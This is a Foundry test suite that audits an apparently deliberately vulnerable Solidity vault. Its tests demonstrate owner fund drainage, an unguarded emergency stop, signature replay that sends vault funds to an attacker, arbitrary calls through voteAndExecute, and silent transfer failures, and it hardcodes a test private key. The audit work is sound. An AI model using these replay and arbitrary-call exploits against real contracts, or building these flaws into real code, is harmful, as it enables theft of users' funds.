// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import { Test } from "forge-std/Test.sol";
import { MultiVulnerableVault } from "../src/MultiVulnerableVault.sol";
import { NoReceiveContract } from "./helpers/NoReceiveContract.sol";
import { ReceiveContract } from "./helpers/ReceiveContract.sol";
import { MaliciousContract } from "./helpers/MaliciousContract.sol";

/// @title MultiVulnerableVaultTest
/// @author Therock Ani
/// @notice Test suite for auditing security vulnerabilities in the MultiVulnerableVault contract.
/// @dev Tests critical issues including owner fund drainage, emergency stop access, user cap limits,
///      signature replay attacks, arbitrary call execution, state change persistence, and deposit callback
///      restrictions. Uses Foundry for simulation and state verification.
contract MultiVulnerableVaultTest is Test {
    MultiVulnerableVault vault;
    address constant OWNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address user1;
    address user2;
    address attacker;
    uint256 constant PRIVATE_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    bytes32 constant RECOVER_MESSAGE_HASH = keccak256(abi.encodePacked("RECOVER"));
    bytes signature;

    /// @notice Sets up the test environment by deploying the vault and configuring initial conditions.
    /// @dev Deploys MultiVulnerableVault with OWNER, assigns user addresses, funds accounts, and generates
    ///      a signature for recoverFunds tests.
    function setUp() public {
        user1 = vm.addr(1);
        user2 = vm.addr(2);
        attacker = vm.addr(3);

        vm.prank(OWNER);
        vault = new MultiVulnerableVault();

        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(attacker, 10 ether);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PRIVATE_KEY, RECOVER_MESSAGE_HASH);
        signature = abi.encodePacked(r, s, v);
    }

    /// @notice Verifies that the owner can drain funds from the vault.
    /// @dev Tests the adminWithdraw function, confirming the owner can withdraw user deposits.
    /// @custom:security-risk Centralized control allows the owner to drain all funds, violating trust
    ///                       assumptions (audit note: "Owner can drain vault").
    function testOwnerCanDrainFunds() public {
        vm.prank(user1);
        vault.deposit{ value: 2 ether }();

        uint256 before = OWNER.balance;
        vm.prank(OWNER);
        vault.adminWithdraw(OWNER, 2 ether);
        assertEq(OWNER.balance, before + 2 ether, "Owner balance should increase by 2 ETH");
    }

    /// @notice Verifies that any address can toggle the emergency stop.
    /// @dev Tests the toggleEmergency function, confirming unauthorized access to critical functionality.
    /// @custom:security-risk Lack of access control allows any user to toggle emergency stop, enabling
    ///                       potential denial-of-service attacks (audit note: "Anybody can toggle emergency stop").
    function testAnyoneCanToggleEmergencyStop() public {
        vm.prank(attacker);
        vault.toggleEmergency();
        assertEq(vault.emergencyStop(), true, "Emergency stop should be toggled");
    }

    /// @notice Verifies that deposits fail when the maximum user cap is reached.
    /// @dev Tests the deposit function’s user cap check, ensuring it reverts after MAX_USERS deposits.
    /// @custom:security-risk Fixed user cap may prevent legitimate users from depositing, including
    ///                       whitelisted users (audit note: "once it reaches max, even whitelisted users can't
    /// deposit").
    function testMaxUserDepositFailsAfterCap() public {
        for (uint256 i = 0; i < vault.MAX_USERS(); i++) {
            address newUser = vm.addr(i + 4);
            vm.deal(newUser, 2 ether);
            vm.prank(newUser);
            vault.deposit{ value: 1 ether }();
        }

        vm.prank(user1);
        vm.expectRevert("Max users reached");
        vault.deposit{ value: 1 ether }();
    }

    /// @notice Verifies that the recoverFunds function is vulnerable to signature replay attacks.
    /// @dev Tests the recoverFunds function, confirming an attacker can reuse a valid signature to drain funds
    ///      multiple times.
    /// @custom:security-risk Signature replay vulnerability allows unauthorized fund drainage (audit note:
    ///                       "Signature replay, owner funds theft").
    function testSignatureReplayAttack() public {
        vm.prank(user1);
        vault.deposit{ value: 5 ether }();
        assertEq(address(vault).balance, 5 ether, "Vault balance should be 5 ETH");

        vm.prank(attacker);
        vault.recoverFunds(signature);
        assertEq(address(vault).balance, 0, "Vault balance should be 0");
        assertEq(attacker.balance, 15 ether, "Attacker balance should increase by 5 ETH");

        vm.prank(user2);
        vault.deposit{ value: 3 ether }();
        assertEq(address(vault).balance, 3 ether, "Vault balance should be 3 ETH");

        vm.prank(attacker);
        vault.recoverFunds(signature);
        assertEq(address(vault).balance, 0, "Vault balance should be 0 after replay");
        assertEq(attacker.balance, 18 ether, "Attacker balance should increase by 3 ETH");
    }

    /// @notice Verifies that an attacker can drain funds using a valid signature.
    /// @dev Tests the recoverFunds function, confirming unauthorized access with a valid owner signature.
    /// @custom:security-risk Lack of signature validation allows unauthorized fund drainage (audit note:
    ///                       "The signature is hard-coded, making it easy to replay").
    function testUnauthorizedFundDrainWithSignature() public {
        vm.prank(user1);
        vault.deposit{ value: 5 ether }();
        assertEq(address(vault).balance, 5 ether, "Vault balance should be 5 ETH");

        vm.prank(attacker);
        vault.recoverFunds(signature);
        assertEq(address(vault).balance, 0, "Vault balance should be 0");
        assertEq(attacker.balance, 15 ether, "Attacker balance should increase by 5 ETH");
    }

    /// @notice Verifies that the voteAndExecute function allows arbitrary calls to external contracts.
    /// @dev Tests the voteAndExecute function by invoking a malicious contract to toggle the emergency stop.
    /// @custom:security-risk Arbitrary call execution enables potential malicious actions by the owner
    ///                       (audit note: "The voteAndExecute function allows the owner to execute arbitrary calls").
    function testArbitraryCallViaVoteAndExecute() public {
        MaliciousContract malicious = new MaliciousContract();

        vm.prank(user1);
        vault.deposit{ value: 5 ether }();
        assertEq(address(vault).balance, 5 ether, "Vault balance should be 5 ETH");

        address[] memory targets = new address[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = address(malicious);
        data[0] = abi.encodeWithSignature("attack(address)", address(vault));

        vm.prank(OWNER);
        vault.voteAndExecute(targets, data);

        assertEq(malicious.attackPerformed(), true, "Malicious contract attack should be performed");
        assertEq(vault.emergencyStop(), true, "Emergency stop should be toggled");
    }

    /// @notice Verifies that the voteAndExecute function can manipulate vault state.
    /// @dev Tests the voteAndExecute function by directly toggling the emergency stop.
    /// @custom:security-risk Arbitrary call execution allows state manipulation, risking unintended behavior
    ///                       (audit note: "No voting, owner executes arbitrary calls").
    function testArbitraryCallToToggleEmergency() public {
        address[] memory targets = new address[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = address(vault);
        data[0] = abi.encodeWithSignature("toggleEmergency()");

        vm.prank(OWNER);
        vault.voteAndExecute(targets, data);

        assertEq(vault.emergencyStop(), true, "Emergency stop should be toggled");
    }

    /// @notice Verifies that state changes persist when a withdrawal transfer fails.
    /// @dev Tests the withdraw function’s failure to revert on transfer errors, causing state changes without
    ///      ETH transfer. Uses NoReceiveContract and ReceiveContract to simulate a protocol interaction.
    /// @custom:security-risk Non-reverting transfer failure leads to loss of funds by updating state without
    ///                       transferring ETH (audit note: "should revert, emitting event if transfer fails no state
    /// change").
    function testStateChangesNotRevertedOnTransferFailure() public {
        vm.prank(user1);
        vault.deposit{ value: 2 ether }();

        NoReceiveContract newNoReceiveContract = new NoReceiveContract();
        ReceiveContract receiveContract = new ReceiveContract();

        vm.deal(address(newNoReceiveContract), 2 ether);

        vm.etch(address(newNoReceiveContract), address(receiveContract).code);

        vm.prank(address(newNoReceiveContract));
        vault.deposit{ value: 2 ether }();

        vm.etch(address(newNoReceiveContract), type(NoReceiveContract).creationCode);

        (uint256 noReceiveOldBal,,) = vault.users(address(newNoReceiveContract));
        assertEq(noReceiveOldBal, 2 ether, "NoReceiveContract balance should be 2 ETH");
        assertEq(vault.totalLocked(), 4 ether, "Vault totalLocked should be 4 ETH");
        assertEq(address(newNoReceiveContract).balance, 0, "NoReceiveContract should have 0 ETH");
        assertEq(address(vault).balance, 4 ether, "Vault balance should be 4 ETH");

        vm.warp(block.timestamp + vault.LOCK_PERIOD() + 1);

        vm.expectEmit(true, true, false, true);
        emit MultiVulnerableVault.TransferFailed(address(newNoReceiveContract), 1 ether);

        vm.prank(address(newNoReceiveContract));
        vault.withdraw(1 ether);

        (uint256 newNoReceiveBal,,) = vault.users(address(newNoReceiveContract));
        assertEq(newNoReceiveBal, 1 ether, "NoReceiveContract balance should be 1 ETH");
        assertEq(vault.totalLocked(), 3 ether, "Vault totalLocked should be 3 ETH");
        assertEq(address(newNoReceiveContract).balance, 0, "NoReceiveContract should have 0 ETH after withdraw");
        assertEq(address(vault).balance, 4 ether, "Vault balance should remain 4 ETH");
    }

    /// @notice Verifies that the external call in the deposit function restricts contract interoperability.
    /// @dev Tests the deposit function’s `(bool success,) = msg.sender.call{value: 0}("");` call, which reverts
    ///      if the caller lacks a receive or fallback function, preventing protocols without these functions
    ///      from depositing. Simulates two scenarios:
    ///      - NoReceiveContract: Represents a protocol (e.g., DeFi contract or DAO) without a receive or
    ///        fallback function, expected to fail due to the callback.
    ///      - ReceiveContract: Represents a protocol designed to handle ETH transfers, expected to succeed.
    ///      Verifies state changes and balances to confirm the callback’s impact on interoperability.
    /// @custom:security-risk The external call unnecessarily restricts contract interactions, violating
    ///                       best practices for interoperability (audit note: "External call to sender with
    ///                       0 value (dangerous, can trigger fallback) call not necessary").
    function testDepositCallbackEffect() public {
        NoReceiveContract noReceiveContract = new NoReceiveContract();
        ReceiveContract receiveContract = new ReceiveContract();

        vm.deal(address(noReceiveContract), 2 ether);
        vm.deal(address(receiveContract), 2 ether);

        vm.prank(address(noReceiveContract));
        vm.expectRevert("Callback failed");
        vault.deposit{ value: 2 ether }();

        (uint256 noReceiveBal,,) = vault.users(address(noReceiveContract));
        assertEq(noReceiveBal, 0, "NoReceiveContract balance should be 0");
        assertEq(vault.totalLocked(), 0, "Vault totalLocked should be 0");
        assertEq(address(noReceiveContract).balance, 2 ether, "NoReceiveContract should retain 2 ETH");
        assertEq(address(vault).balance, 0, "Vault balance should be 0");

        vm.prank(address(receiveContract));
        vault.deposit{ value: 2 ether }();

        (uint256 receiveBal,,) = vault.users(address(receiveContract));
        assertEq(receiveBal, 2 ether, "ReceiveContract balance should be 2 ETH");
        assertEq(vault.totalLocked(), 2 ether, "Vault totalLocked should be 2 ETH");
        assertEq(address(receiveContract).balance, 0, "ReceiveContract should have 0 ETH");
        assertEq(address(vault).balance, 2 ether, "Vault balance should be 2 ETH");
    }
}
